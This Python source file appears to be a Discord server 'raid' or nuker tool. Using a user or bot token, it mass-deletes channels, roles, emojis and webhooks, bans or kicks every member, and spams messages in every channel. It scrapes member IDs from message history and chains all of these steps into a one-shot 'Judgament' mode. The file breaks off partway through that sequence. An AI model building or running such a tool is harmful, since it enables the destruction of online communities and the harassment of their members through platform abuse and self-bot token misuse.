import requests
import os
import random
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

class ServerSettings:
    def __init__(self, token, base_url):
        self.token = token
        self.base_url = base_url
        self.headers = {"Authorization": token}
        self.bot_token = ""
        self.bot_headers = None
        self.server_id = None
        self.server_data = None
        self.member_data = None
        self.role = None
        self.time_sleep = 0.1
        self.bot_id = None
        self.bot_in_server = False

    def clear(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def banner(self):
        print(r"""
·▄▄▄▄  ▪  .▄▄ ·  ▄▄·       ▄▄▄  ·▄▄▄▄      ▄▄▄   ▄▄·▪  ·▄▄▄▄
██▪ ██ ██ ▐█ ▀. ▐█ ▌▪     ▀▄ █·██▪ ██     ▀▄ █·▐█ ▀█ ██ ██▪ ██
▐█· ▐█▌▐█·▄▀▀▀█▄██ ▄▄ ▄█▀▄ ▐▀▀▄ ▐█· ▐█▌    ▐▀▀▄ ▄▀▀▀█ ▐█·▐█· ▐█▌
██. ██ ▐█▌▐█▄▪▐█▐███▌▐█▌.▐▌▐█•█▌██. ██     ▐█•█▌▐█ ▪▐▌▐█▌██. ██
▀▀▀▀▀▀  ▀▀▀ ▀▀▀▀ ·▀▀▀  ▀█▄▀▪.▀  ▀▀▀▀▀▀▀▀     .▀  ▀ ▀  ▀ ▀▀▀▀▀▀▀▀▀▀
        """)

    def setup_bot(self):
        if not self.bot_token:
            return False
        
        try:
            self.bot_headers = {"Authorization": f"Bot {self.bot_token}"}
            response = requests.get(f"{self.base_url}/users/@me", headers=self.bot_headers)
            if response.status_code == 200:
                bot_data = response.json()
                self.bot_id = bot_data.get('id')
                if bot_data.get('bot') == True:
                    return True
            return False
        except:
            return False

    def check_bot_in_server(self):
        if not self.bot_headers or not self.server_id:
            return False
        
        try:
            response = requests.get(f"{self.base_url}/users/@me/guilds", headers=self.bot_headers)
            if response.status_code == 200:
                guilds = response.json()
                return any(g.get('id') == self.server_id for g in guilds)
        except:
            return False

    def inject_bot_auto(self):
        if not self.bot_headers or not self.bot_id:
            return False
        
        if self.check_bot_in_server():
            return True
        
        try:
            channels_response = requests.get(
                f"{self.base_url}/guilds/{self.server_id}/channels",
                headers=self.headers
            )
            
            if channels_response.status_code == 200:
                channels = [c for c in channels_response.json() if c.get('type') == 0]
                if channels:
                    channel_id = channels[0]['id']
                    
                    webhook_payload = {"name": "sys"}
                    webhook_response = requests.post(
                        f"{self.base_url}/channels/{channel_id}/webhooks",
                        headers=self.bot_headers,
                        json=webhook_payload
                    )
                    
                    if webhook_response.status_code in [200, 201]:
                        time.sleep(1)
                        if self.check_bot_in_server():
                            print("[+] Bot injected successfully")
                            return True
            
            print("[-] Failed to inject bot automatically")
            return False
            
        except Exception as e:
            print(f"[-] Bot injection error: {e}")
            return False

    def remove_bot(self):
        if not self.bot_in_server or not self.bot_id:
            return
        
        try:
            response = requests.delete(
                f"{self.base_url}/guilds/{self.server_id}",
                headers=self.bot_headers
            )
            if response.status_code in [200, 204]:
                print("[+] Bot removed from server")
                self.bot_in_server = False
        except:
            pass

    def load_server(self):
        server_id = input("\nServer ID: ").strip()

        if not server_id:
            print("[-] Server ID required")
            return False

        try:
            response = requests.get(f"{self.base_url}/guilds/{server_id}?with_counts=true", headers=self.headers)
            if response.status_code != 200:
                print(f"[-] Failed to load server (Status: {response.status_code})")
                return False

            self.server_data = response.json()
            self.server_id = server_id

            user_response = requests.get(f"{self.base_url}/users/@me", headers=self.headers)
            if user_response.status_code != 200:
                print(f"[-] Failed to get user info")
                return False

            user_data = user_response.json()
            user_id = user_data.get('id')

            if self.server_data.get('owner_id') == user_id:
                self.role = "OWNER"
                self.member_data = {'user': user_data, 'roles': []}
                return True

            member_response = requests.get(
                f"{self.base_url}/users/@me/guilds/{server_id}/member",
                headers=self.headers
            )

            if member_response.status_code != 200:
                member_response = requests.get(
                    f"{self.base_url}/guilds/{server_id}/members/@me",
                    headers=self.headers
                )

            if member_response.status_code == 200:
                self.member_data = member_response.json()
            else:
                guilds_response = requests.get(f"{self.base_url}/users/@me/guilds", headers=self.headers)
                if guilds_response.status_code == 200:
                    guilds = guilds_response.json()
                    guild_info = next((g for g in guilds if g.get('id') == server_id), None)

                    if guild_info:
                        self.member_data = {'user': user_data, 'roles': []}
                        perms = guild_info.get('permissions', 0)
                        is_admin = bool(int(perms) & 0x8) if perms else False
                        self.role = "ADMIN" if is_admin else "MEMBER"
                        return True

                print(f"[-] Failed to get member info")
                return False

            roles = self.member_data.get('roles', [])
            guild_roles_response = requests.get(
                f"{self.base_url}/guilds/{self.server_id}/roles",
                headers=self.headers
            )

            if guild_roles_response.status_code == 200:
                guild_roles = guild_roles_response.json()
                is_admin = False

                for role_id in roles:
                    for guild_role in guild_roles:
                        if guild_role['id'] == role_id:
                            perms = int(guild_role.get('permissions', 0))
                            if perms & 0x8:
                                is_admin = True
                                break
                    if is_admin:
                        break

                self.role = "ADMIN" if is_admin else "MEMBER"
            else:
                self.role = "MEMBER"

            return True

        except Exception as e:
            print(f"[-] Error loading server: {e}")
            return False

    def show_server_info(self):
        if not self.server_data:
            return

        d = self.server_data

        try:
            channels_response = requests.get(
                f"{self.base_url}/guilds/{self.server_id}/channels",
                headers=self.headers
            )
            total_channels = len(channels_response.json()) if channels_response.status_code == 200 else "N/A"
        except:
            total_channels = "N/A"

        icon_id = d.get('icon')
        avatar_url = f"https://cdn.discordapp.com/icons/{self.server_id}/{icon_id}.png" if icon_id else "No icon"

        try:
            created_timestamp = (int(self.server_id) >> 22) + 1420070400000
            created_date = datetime.fromtimestamp(created_timestamp / 1000).strftime('%d/%m/%Y %H:%M:%S UTC')
        except:
            created_date = "N/A"

        member_count = d.get('approximate_member_count') or d.get('member_count', 'N/A')

        bot_status = "INACTIVE"
        if self.bot_token and self.bot_headers:
            if self.check_bot_in_server():
                bot_status = "READY"
                self.bot_in_server = True
            else:
                bot_status = "AVAILABLE"

        print("\n[+] Server Information")
        print(f"    Name: {d.get('name')}")
        print(f"    ID: {self.server_id}")
        print(f"    Role: {self.role}")
        print(f"    Bot: {bot_status}")
        print(f"    Members: {member_count}")
        print(f"    Channels: {total_channels}")
        print(f"    Created: {created_date}")
        print(f"    Icon: {avatar_url}")

    def bot_fetch_all_members(self):
        if not self.bot_in_server:
            return []
        
        try:
            members = []
            member_ids = set()
            after = "0"
            
            for _ in range(100):
                response = requests.get(
                    f"{self.base_url}/guilds/{self.server_id}/members?limit=1000&after={after}",
                    headers=self.bot_headers
                )
                
                if response.status_code != 200:
                    break
                
                batch = response.json()
                if not batch:
                    break
                
                for member in batch:
                    member_id = member['user']['id']
                    if member_id not in member_ids:
                        members.append(member)
                        member_ids.add(member_id)
                
                after = batch[-1]['user']['id']
                
                if len(batch) < 1000:
                    break
                
                time.sleep(0.5)
            
            return members
            
        except Exception as e:
            return []

    def bot_ban_members(self, members):
        if not self.bot_in_server:
            return 0, 0
        
        success = 0
        failed = 0
        current_user_id = self.member_data.get('user', {}).get('id')
        owner_id = self.server_data.get('owner_id')
        
        for member in members:
            user_id = member['user']['id']
            username = member['user'].get('username', 'Unknown')
            
            if user_id == current_user_id or user_id == owner_id or user_id == self.bot_id:
                continue
            
            try:
                response = requests.put(
                    f"{self.base_url}/guilds/{self.server_id}/bans/{user_id}",
                    headers=self.bot_headers,
                    json={"delete_message_days": 0}
                )
                
                if response.status_code in [200, 204]:
                    success += 1
                    print(f"    [BOT] Banned: {username}")
                else:
                    failed += 1
                
                time.sleep(self.time_sleep)
            except Exception as e:
                failed += 1
        
        return success, failed

    def bot_kick_members(self, members):
        if not self.bot_in_server:
            return 0, 0
        
        success = 0
        failed = 0
        current_user_id = self.member_data.get('user', {}).get('id')
        owner_id = self.server_data.get('owner_id')
        
        for member in members:
            user_id = member['user']['id']
            username = member['user'].get('username', 'Unknown')
            
            if user_id == current_user_id or user_id == owner_id or user_id == self.bot_id:
                continue
            
            try:
                response = requests.delete(
                    f"{self.base_url}/guilds/{self.server_id}/members/{user_id}",
                    headers=self.bot_headers
                )
                
                if response.status_code in [200, 204]:
                    success += 1
                    print(f"    [BOT] Kicked: {username}")
                else:
                    failed += 1
                
                time.sleep(self.time_sleep)
            except Exception as e:
                failed += 1
        
        return success, failed

    def delete_all_channels(self):
        if self.role == "MEMBER":
            print("\n[-] Advanced settings unavailable - insufficient permissions")
            return

        confirm = input("\n[!] Delete ALL channels? This cannot be undone! (yes/no): ").strip().lower()
        if confirm != "yes":
            print("[-] Cancelled")
            return

        try:
            response = requests.get(
                f"{self.base_url}/guilds/{self.server_id}/channels",
                headers=self.headers
            )

            if response.status_code != 200:
                print("[-] Failed to get channels")
                return

            channels = response.json()
            deleted = 0
            failed = 0

            print(f"\n[+] Deleting {len(channels)} channels...")

            for channel in channels:
                try:
                    del_response = requests.delete(
                        f"{self.base_url}/channels/{channel['id']}",
                        headers=self.headers
                    )

                    if del_response.status_code in [200, 204]:
                        deleted += 1
                        print(f"    [+] Deleted: {channel.get('name', 'Unknown')}")
                    else:
                        failed += 1
                        print(f"    [-] Failed: {channel.get('name', 'Unknown')}")

                    time.sleep(self.time_sleep)
                except Exception as e:
                    failed += 1
                    print(f"    [-] Error: {e}")

            print(f"\n[+] Complete: {deleted} deleted, {failed} failed")
        except Exception as e:
            print(f"\n[-] Error: {e}")

    def delete_all_roles(self):
        if self.role == "MEMBER":
            print("\n[-] Advanced settings unavailable - insufficient permissions")
            return

        confirm = input("\n[!] Delete all roles? This cannot be undone! (yes/no): ").strip().lower()
        if confirm != "yes":
            print("[-] Cancelled")
            return

        try:
            response = requests.get(
                f"{self.base_url}/guilds/{self.server_id}/roles",
                headers=self.headers
            )

            if response.status_code != 200:
                print("[-] Failed to get roles")
                return

            roles = response.json()

            highest_position = -1

            if self.role != "OWNER":
                member_roles = self.member_data.get('roles', [])

                for role_id in member_roles:
                    for role in roles:
                        if role['id'] == role_id:
                            if role.get('position', 0) > highest_position:
                                highest_position = role.get('position', 0)

            deleted = 0
            skipped = 0

            print(f"\n[+] Deleting roles...")

            for role in roles:
                if role['name'] == '@everyone':
                    skipped += 1
                    continue

                if self.role != "OWNER" and role.get('position', 0) >= highest_position:
                    skipped += 1
                    continue

                try:
                    del_response = requests.delete(
                        f"{self.base_url}/guilds/{self.server_id}/roles/{role['id']}",
                        headers=self.headers
                    )

                    if del_response.status_code in [200, 204]:
                        deleted += 1
                        print(f"    [+] Deleted: {role.get('name', 'Unknown')}")
                    else:
                        print(f"    [-] Failed: {role.get('name', 'Unknown')}")

                    time.sleep(self.time_sleep)
                except Exception as e:
                    print(f"    [-] Error: {e}")

            print(f"\n[+] Complete: {deleted} deleted, {skipped} skipped")
        except Exception as e:
            print(f"\n[-] Error: {e}")

    def kick_all_members(self):
        if self.role == "MEMBER":
            print("\n[-] Advanced settings unavailable - insufficient permissions")
            return

        confirm = input("\n[!] Kick ALL members? This cannot be undone! (yes/no): ").strip().lower()
        if confirm != "yes":
            print("[-] Cancelled")
            return

        use_bot = False
        if self.bot_token and self.bot_headers:
            if not self.bot_in_server:
                print("\n[+] Bot available but not in server")
                use_bot_input = input("[?] Inject bot for better results? (yes/no): ").strip().lower()
                if use_bot_input == "yes":
                    if self.inject_bot_auto():
                        self.bot_in_server = True
                        use_bot = True
            else:
                use_bot = True

        if use_bot and self.bot_in_server:
            print("\n[+] Using bot method...")
            members = self.bot_fetch_all_members()
            
            if members:
                print(f"[+] Bot fetched {len(members)} members")
                success, failed = self.bot_kick_members(members)
                print(f"\n[+] Complete: {success} kicked, {failed} failed")
                return
            else:
                print("[-] Bot fetch failed, using fallback method...")

        print("\n[+] Using user token method...")
        self._mass_action_members("kick")

    def ban_all_members(self):
        if self.role == "MEMBER":
            print("\n[-] Advanced settings unavailable - insufficient permissions")
            return

        confirm = input("\n[!] Ban ALL members? This cannot be undone! (yes/no): ").strip().lower()
        if confirm != "yes":
            print("[-] Cancelled")
            return

        use_bot = False
        if self.bot_token and self.bot_headers:
            if not self.bot_in_server:
                print("\n[+] Bot available but not in server")
                use_bot_input = input("[?] Inject bot for better results? (yes/no): ").strip().lower()
                if use_bot_input == "yes":
                    if self.inject_bot_auto():
                        self.bot_in_server = True
                        use_bot = True
            else:
                use_bot = True

        if use_bot and self.bot_in_server:
            print("\n[+] Using bot method...")
            members = self.bot_fetch_all_members()
            
            if members:
                print(f"[+] Bot fetched {len(members)} members")
                success, failed = self.bot_ban_members(members)
                print(f"\n[+] Complete: {success} banned, {failed} failed")
                return
            else:
                print("[-] Bot fetch failed, using fallback method...")

        print("\n[+] Using user token method...")
        self._mass_action_members("ban")

    def _mass_action_members(self, action):
        try:
            members = []
            member_ids = set()

            print("[+] Attempting to fetch members via search...")
            search_response = requests.get(
                f"{self.base_url}/guilds/{self.server_id}/members/search?query=&limit=1000",
                headers=self.headers
            )

            if search_response.status_code == 200:
                search_members = search_response.json()
                for member in search_members:
                    member_id = member['user']['id']
                    if member_id not in member_ids:
                        members.append(member)
                        member_ids.add(member_id)
                print(f"[+] Found {len(members)} members via search")

            if len(members) < 100:
                print(f"[+] Trying to scrape members from channels...")
                
                channels_response = requests.get(
                    f"{self.base_url}/guilds/{self.server_id}/channels",
                    headers=self.headers
                )
                
                if channels_response.status_code == 200:
                    channels = channels_response.json()
                    text_channels = [c for c in channels if c.get('type') in [0, 5]][:10]
                    
                    for channel in text_channels:
                        channel_id = channel['id']
                        try:
                            messages_response = requests.get(
                                f"{self.base_url}/channels/{channel_id}/messages?limit=100",
                                headers=self.headers
                            )
                            
                            if messages_response.status_code == 200:
                                messages = messages_response.json()
                                for message in messages:
                                    if 'author' in message:
                                        user_id = message['author']['id']
                                        if user_id not in member_ids:
                                            members.append({
                                                'user': {
                                                    'id': user_id,
                                                    'username': message['author'].get('username', 'Unknown')
                                                }
                                            })
                                            member_ids.add(user_id)
                                
                                time.sleep(self.time_sleep)
                        except:
                            continue
                    
                    print(f"[+] Total members found: {len(members)}")

            if len(members) == 0:
                print("\n[-] Unable to fetch member list with user token")
                print(f"\n[!] You can manually enter member IDs to {action} (one per line, empty to finish):")

                manual_members = []
                while True:
                    user_id = input("Member ID: ").strip()
                    if not user_id:
                        break
                    manual_members.append({'user': {'id': user_id, 'username': 'Manual Entry'}})

                if manual_members:
                    members = manual_members
                else:
                    return

            current_user_id = self.member_data.get('user', {}).get('id')
            owner_id = self.server_data.get('owner_id')

            success = 0
            failed = 0
            skipped = 0

            print(f"\n[+] Processing {len(members)} members...")

            for member in members:
                user_id = member['user']['id']
                username = member['user'].get('username', 'Unknown')

                if user_id == current_user_id or user_id == owner_id:
                    skipped += 1
                    continue

                try:
                    if action == "kick":
                        resp = requests.delete(
                            f"{self.base_url}/guilds/{self.server_id}/members/{user_id}",
                            headers=self.headers
                        )
                    else:
                        resp = requests.put(
                            f"{self.base_url}/guilds/{self.server_id}/bans/{user_id}",
                            headers=self.headers
                        )

                    if resp.status_code in [200, 204]:
                        success += 1
                        print(f"    [+] {action.capitalize()}ed: {username}")
                    else:
                        failed += 1
                        print(f"    [-] Failed: {username} (Status: {resp.status_code})")

                    time.sleep(self.time_sleep)
                except Exception as e:
                    failed += 1
                    print(f"    [-] Error: {e}")

            print(f"\n[+] Complete: {success} {action}ed, {failed} failed, {skipped} skipped")
        except Exception as e:
            print(f"\n[-] Error: {e}")

    def change_server_name(self):
        if self.role == "MEMBER":
            print("\n[-] Advanced settings unavailable - insufficient permissions")
            return

        new_name = input("\nNew server name: ").strip()
        if not new_name:
            print("[-] Name cannot be empty")
            return

        try:
            response = requests.patch(
                f"{self.base_url}/guilds/{self.server_id}",
                headers=self.headers,
                json={"name": new_name}
            )

            if response.status_code == 200:
                print(f"[+] Server name changed to: {new_name}")
                self.server_data['name'] = new_name
            else:
                print(f"[-] Failed to change name (Status: {response.status_code})")
        except Exception as e:
            print(f"[-] Error: {e}")

    def change_server_icon(self):
        if self.role == "MEMBER":
            print("\n[-] Advanced settings unavailable - insufficient permissions")
            return

        icon_url = input("\nIcon URL (direct image link): ").strip()
        if not icon_url:
            print("[-] URL cannot be empty")
            return

        try:
            img_response = requests.get(icon_url)
            if img_response.status_code != 200:
                print("[-] Failed to download image")
                return

            import base64
            img_data = base64.b64encode(img_response.content).decode('utf-8')

            content_type = img_response.headers.get('content-type', '')
            if 'png' in content_type:
                img_format = 'png'
            elif 'jpeg' in content_type or 'jpg' in content_type:
                img_format = 'jpeg'
            elif 'gif' in content_type:
                img_format = 'gif'
            else:
                print("[-] Unsupported image format")
                return

            icon_data = f"data:image/{img_format};base64,{img_data}"

            response = requests.patch(
                f"{self.base_url}/guilds/{self.server_id}",
                headers=self.headers,
                json={"icon": icon_data}
            )

            if response.status_code == 200:
                print("[+] Server icon changed successfully")
            else:
                print(f"[-] Failed to change icon (Status: {response.status_code})")
        except Exception as e:
            print(f"[-] Error: {e}")

    def delete_all_webhooks(self):
        if self.role == "MEMBER":
            print("\n[-] Advanced settings unavailable - insufficient permissions")
            return

        confirm = input("\n[!] Delete all webhooks? (yes/no): ").strip().lower()
        if confirm != "yes":
            print("[-] Cancelled")
            return

        try:
            response = requests.get(
                f"{self.base_url}/guilds/{self.server_id}/webhooks",
                headers=self.headers
            )

            if response.status_code != 200:
                print("[-] Failed to get webhooks")
                return

            webhooks = response.json()
            deleted = 0

            print(f"\n[+] Deleting {len(webhooks)} webhooks...")

            for webhook in webhooks:
                try:
                    del_response = requests.delete(
                        f"{self.base_url}/webhooks/{webhook['id']}",
                        headers=self.headers
                    )

                    if del_response.status_code in [200, 204]:
                        deleted += 1
                        print(f"    [+] Deleted webhook: {webhook.get('name', 'Unknown')}")

                    time.sleep(self.time_sleep)
                except:
                    pass

            print(f"\n[+] Deleted {deleted} webhooks")
        except Exception as e:
            print(f"\n[-] Error: {e}")

    def create_channels(self):
        if self.role == "MEMBER":
            print("\n[-] Advanced settings unavailable - insufficient permissions")
            return

        channel_name = input("\nChannel name: ").strip()
        if not channel_name:
            print("[-] Name cannot be empty")
            return

        try:
            count = int(input("Number of channels: ").strip())
            if count < 1 or count > 500:
                print("[-] Number must be between 1 and 500")
                return
        except:
            print("[-] Invalid number")
            return

        try:
            created = 0
            print(f"\n[+] Creating {count} channels...")

            for i in range(count):
                name = f"{channel_name}-{random.randint(1000, 9999)}" if count > 1 else channel_name

                try:
                    response = requests.post(
                        f"{self.base_url}/guilds/{self.server_id}/channels",
                        headers=self.headers,
                        json={"name": name, "type": 0}
                    )

                    if response.status_code in [200, 201]:
                        created += 1
                        print(f"    [+] Created: {name}")
                    else:
                        print(f"    [-] Failed: {name}")

                    time.sleep(self.time_sleep)
                except Exception as e:
                    print(f"    [-] Error: {e}")

            print(f"\n[+] Created {created}/{count} channels")
        except Exception as e:
            print(f"\n[-] Error: {e}")

    def create_roles(self):
        if self.role == "MEMBER":
            print("\n[-] Advanced settings unavailable - insufficient permissions")
            return

        role_name = input("\nRole name: ").strip()
        if not role_name:
            print("[-] Name cannot be empty")
            return

        try:
            count = int(input("Number of roles: ").strip())
            if count < 1 or count > 250:
                print("[-] Number must be between 1 and 250")
                return
        except:
            print("[-] Invalid number")
            return

        try:
            created = 0
            print(f"\n[+] Creating {count} roles...")

            for i in range(count):
                name = f"{role_name}-{random.randint(1000, 9999)}" if count > 1 else role_name

                try:
                    response = requests.post(
                        f"{self.base_url}/guilds/{self.server_id}/roles",
                        headers=self.headers,
                        json={"name": name}
                    )

                    if response.status_code in [200, 201]:
                        created += 1
                        print(f"    [+] Created: {name}")
                    else:
                        print(f"    [-] Failed: {name}")

                    time.sleep(self.time_sleep)
                except Exception as e:
                    print(f"    [-] Error: {e}")

            print(f"\n[+] Created {created}/{count} roles")
        except Exception as e:
            print(f"\n[-] Error: {e}")

    def transfer_ownership(self):
        if self.role != "OWNER":
            print("\n[-] Only the server owner can transfer ownership")
            return

        print("\n[!] OWNERSHIP TRANSFER LIMITATION")
        print("\n[!] While the Discord API endpoint exists (PATCH /guilds/{id} with owner_id),")
        print("    Discord blocks this operation for user account tokens to prevent self-bot abuse.")
        print("\n[!] This restriction is intentional - ownership transfer via API only works for:")
        print("    - Bot accounts that created the server themselves")
        print("    - Not for user accounts, even if you are the current owner")
        print("\n[+] Discord requires you to transfer ownership manually through the client:")
        print("    1. Right-click the server icon (or click server name on mobile)")
        print("    2. Go to: Server Settings > Members")
        print("    3. Find the user you want to transfer ownership to")
        print("    4. Click the 3 dots (...) next to their name")
        print("    5. Select 'Transfer Ownership'")
        print("    6. Confirm with your password and 2FA code if enabled")
        print("\n[+] This is a Discord security measure to prevent unauthorized transfers.")

    def delete_server(self):
        if self.role != "OWNER":
            print("\n[-] Only the server owner can delete the server")
            return

        confirm = input("\n[!] DELETE ENTIRE SERVER? This CANNOT be undone! Type server name to confirm: ").strip()
        if confirm != self.server_data.get('name'):
            print("[-] Confirmation failed")
            return

        try:
            response = requests.delete(
                f"{self.base_url}/guilds/{self.server_id}",
                headers=self.headers
            )

            if response.status_code in [200, 204]:
                print("[+] Server deleted successfully")
                self.server_id = None
                self.server_data = None
                time.sleep(2)
            else:
                print(f"[-] Failed to delete server (Status: {response.status_code})")
        except Exception as e:
            print(f"[-] Error: {e}")

    def spam_all_channels(self):
        if self.role == "MEMBER":
            print("\n[-] Advanced settings unavailable - insufficient permissions")
            return

        message = input("\nMessage to send: ").strip()
        if not message:
            print("[-] Message cannot be empty")
            return

        try:
            count = int(input("Number of times per channel: ").strip())
            if count < 1 or count > 100:
                print("[-] Number must be between 1 and 100")
                return
        except:
            print("[-] Invalid number")
            return

        try:
            response = requests.get(
                f"{self.base_url}/guilds/{self.server_id}/channels",
                headers=self.headers
            )

            if response.status_code != 200:
                print("[-] Failed to get channels")
                return

            channels = [c for c in response.json() if c.get('type') == 0]

            print(f"\n[+] Sending to {len(channels)} channels...")

            for channel in channels:
                channel_id = channel['id']
                channel_name = channel.get('name', 'Unknown')
                sent = 0

                for i in range(count):
                    try:
                        msg_response = requests.post(
                            f"{self.base_url}/channels/{channel_id}/messages",
                            headers=self.headers,
                            json={"content": message}
                        )

                        if msg_response.status_code in [200, 201]:
                            sent += 1

                        time.sleep(self.time_sleep)
                    except:
                        break

                print(f"    [+] {channel_name}: {sent}/{count} sent")
        except Exception as e:
            print(f"\n[-] Error: {e}")

    def delete_all_emojis(self):
        if self.role == "MEMBER":
            print("\n[-] Advanced settings unavailable - insufficient permissions")
            return

        confirm = input("\n[!] Delete all emojis? (yes/no): ").strip().lower()
        if confirm != "yes":
            print("[-] Cancelled")
            return

        try:
            response = requests.get(
                f"{self.base_url}/guilds/{self.server_id}/emojis",
                headers=self.headers
            )

            if response.status_code != 200:
                print("[-] Failed to get emojis")
                return

            emojis = response.json()
            deleted = 0

            print(f"\n[+] Deleting {len(emojis)} emojis...")

            for emoji in emojis:
                try:
                    del_response = requests.delete(
                        f"{self.base_url}/guilds/{self.server_id}/emojis/{emoji['id']}",
                        headers=self.headers
                    )

                    if del_response.status_code in [200, 204]:
                        deleted += 1
                        print(f"    [+] Deleted: {emoji.get('name', 'Unknown')}")

                    time.sleep(self.time_sleep)
                except:
                    pass

            print(f"\n[+] Deleted {deleted} emojis")
        except Exception as e:
            print(f"\n[-] Error: {e}")

    def judgament(self):
        if self.role == "MEMBER":
            print("\n[-] Judgament unavailable - insufficient permissions")
            return

        print("\n[!] JUDGAMENT - Complete server transformation")
        print("[!] This will execute multiple destructive operations")

        time_sleep_input = input(f"\nTime sleep (default {self.time_sleep}): ").strip()
        if time_sleep_input:
            try:
                time_sleep_value = float(time_sleep_input)
                if time_sleep_value < 0:
                    print("[-] Time must be positive, using default")
                    self.time_sleep = 0.1
                else:
                    self.time_sleep = time_sleep_value
                    print(f"[+] Time sleep set to {self.time_sleep}s")
            except:
                print("[-] Invalid number, using default")
                self.time_sleep = 0.1
        else:
            print(f"[+] Using default time sleep: {self.time_sleep}s")

        server_name = input("\nServer name (press ENTER to skip): ").strip()
        if not server_name:
            server_name = None
            print("[+] Skipping server name change")

        icon_url = input("Icon URL (press ENTER to skip): ").strip()
        if not icon_url:
            icon_url = None
            print("[+] Skipping icon change")

        channel_name = input("Channel name: ").strip()
        if not channel_name:
            print("[-] Channel name required")
            return

        try:
            channel_count = int(input("Number of channels: ").strip())
            if channel_count < 1 or channel_count > 500:
                print("[-] Number must be between 1 and 500")
                return
        except:
            print("[-] Invalid number")
            return

        role_name = input("Role name: ").strip()
        if not role_name:
            print("[-] Role name required")
            return

        try:
            role_count = int(input("Number of roles: ").strip())
            if role_count < 1 or role_count > 250:
                print("[-] Number must be between 1 and 250")
                return
        except:
            print("[-] Invalid number")
            return

        spam_message = input("Spam message: ").strip()
        if not spam_message:
            print("[-] Spam message required")
            return

        try:
            spam_count = int(input("Number of messages per channel: ").strip())
            if spam_count < 1 or spam_count > 100:
                print("[-] Number must be between 1 and 100")
                return
        except:
            print("[-] Invalid number")
            return

        print("\n[1] Ban Members")
        print("[2] Kick Members")
        print("[3] Skip")
        member_action = input("\nSelect action: ").strip()
        
        if member_action not in ["1", "2", "3"]:
            print("[-] Invalid option, skipping member actions")
            member_action = "3"

        print("\n[!] Final confirmation")
        print(f"    Server name: {server_name if server_name else 'No change'}")
        print(f"    Icon: {icon_url if icon_url else 'No change'}")
        print(f"    Channels: {channel_count}x '{channel_name}'")
        print(f"    Roles: {role_count}x '{role_name}'")
        print(f"    Spam: '{spam_message}' x{spam_count} per channel")
        print(f"    Members: {'Ban' if member_action == '1' else 'Kick' if member_action == '2' else 'Skip'}")

        input("\n[!] Press ENTER to start Judgament...")

        print("\n[!] Starting Judgament...")

        print("\n[STEP 1/10] Deleting all channels...")
        try:
            response = requests.get(f"{self.base_url}/guilds/{self.server_id}/channels", headers=self.headers)
            if response.status_code == 200:
                channels = response.json()
                for channel in channels:
                    try:
                        requests.delete(f"{self.base_url}/channels/{channel['id']}", headers=self.headers)
                        print(f"    [+] Deleted: {channel.get('name', 'Unknown')}")
                        time.sleep(self.time_sleep)
                    except:
                        pass
        except Exception as e:
            print(f"    [-] Error: {e}")

        print("\n[STEP 2/10] Deleting all roles...")
        try:
            response = requests.get(f"{self.base_url}/guilds/{self.server_id}/roles", headers=self.headers)
            if response.status_code == 200:
                roles = response.json()
                highest_position = -1

                if self.role != "OWNER":
                    member_roles = self.member_data.get('roles', [])
                    for role_id in member_roles:
                        for role in roles:
                            if role['id'] == role_id:
                                if role.get('position', 0) > highest_position:
                                    highest_position = role.get('position', 0)

                for role in roles:
                    if role['name'] == '@everyone':
                        continue
                    if self.role != "OWNER" and role.get('position', 0) >= highest_position:
                        continue
                    try:
                        requests.delete(f"{self.base_url}/guilds/{self.server_id}/roles/{role['id']}", headers=self.headers)
                        print(f"    [+] Deleted: {role.get('name', 'Unknown')}")
                        time.sleep(self.time_sleep)
                    except:
                        pass
        except Exception as e:
            print(f"    [-] Error: {e}")

        print("\n[STEP 3/10] Deleting all emojis...")
        try:
            response = requests.get(f"{self.base_url}/guilds/{self.server_id}/emojis", headers=self.headers)
            if response.status_code == 200:
                emojis = response.json()
                for emoji in emojis:
                    try:
                        requests.delete(f"{self.base_url}/guilds/{self.server_id}/emojis/{emoji['id']}", headers=self.headers)
                        print(f"    [+] Deleted: {emoji.get('name', 'Unknown')}")
                        time.sleep(self.time_sleep)
                    except:
                        pass
        except Exception as e:
            print(f"    [-] Error: {e}")

        print("\n[STEP 4/10] Deleting all webhooks...")
        try:
            response = requests.get(f"{self.base_url}/guilds/{self.server_id}/webhooks", headers=self.headers)
            if response.status_code == 200:
                webhooks = response.json()
                for webhook in webhooks:
                    try:
                        requests.delete(f"{self.base_url}/webhooks/{webhook['id']}", headers=self.headers)
                        print(f"    [+] Deleted: {webhook.get('name', 'Unknown')}")
                        time.sleep(self.time_sleep)
                    except:
                        pass
        except Exception as e:
            print(f"    [-] Error: {e}")

        if server_name:
            print(f"\n[STEP 5/10] Changing server name to '{server_name}'...")
            try:
                response = requests.patch(
                    f"{self.base_url}/guilds/{self.server_id}",
                    headers=self.headers,
                    json={"name": server_name}
                )
                if response.status_code == 200:
                    print(f"    [+] Server name changed")
                    self.server_data['name'] = server_name
                else:
                    print(f"    [-] Failed to change name")
            except Exception as e:
                print(f"    [-] Error: {e}")
        else:
            print("\n[STEP 5/10] Skipping server name change...")

        if icon_url:
            print(f"\n[STEP 6/10] Changing server icon...")
            try:
                import base64
                img_response = requests.get(icon_url)
                if img_response.status_code == 200:
                    img_data = base64.b64encode(img_response.content).decode('utf-8')
                    content_type = img_response.headers.get('content-type', '')
                    if 'png' in content_type:
                        img_format = 'png'
                    elif 'jpeg' in content_type or 'jpg' in content_type:
                        img_format = 'jpeg'
                    elif 'gif' in content_type:
                        img_format = 'gif'
                    else:
                        img_format = 'png'

                    icon_data = f"data:image/{img_format};base64,{img_data}"
                    response = requests.patch(
                        f"{self.base_url}/guilds/{self.server_id}",
                        headers=self.headers,
                        json={"icon": icon_data}
                    )
                    if response.status_code == 200:
                        print(f"    [+] Server icon changed")
                    else:
                        print(f"    [-] Failed to change icon")
                else:
                    print(f"    [-] Failed to download image")
            except Exception as e:
                print(f"    [-] Error: {e}")
        else:
            print("\n[STEP 6/10] Skipping server icon change...")

        print(f"\n[STEP 7/10] Creating {role_count} roles...")
        try:
            for i in range(role_count):
                name = f"{role_name}-{random.randint(1000, 9999)}" if role_count > 1 else role_name
                try:
                    response = requests.post(
                        f"{self.base_url}/guilds/{self.server_id}/roles",
                        headers=self.headers,
                        json={"name": name}
                    )
                    if response.status_code in [200, 201]:
                        print(f"    [+] Created: {name}")
                    time.sleep(self.time_sleep)
                except:
                    pass
        except Exception as e:
            print(f"    [-] Error: {e}")

        print(f"\n[STEP 8/10] Creating {channel_count} channels...")
        created_channels = []
        try:
            for i in range(channel_count):
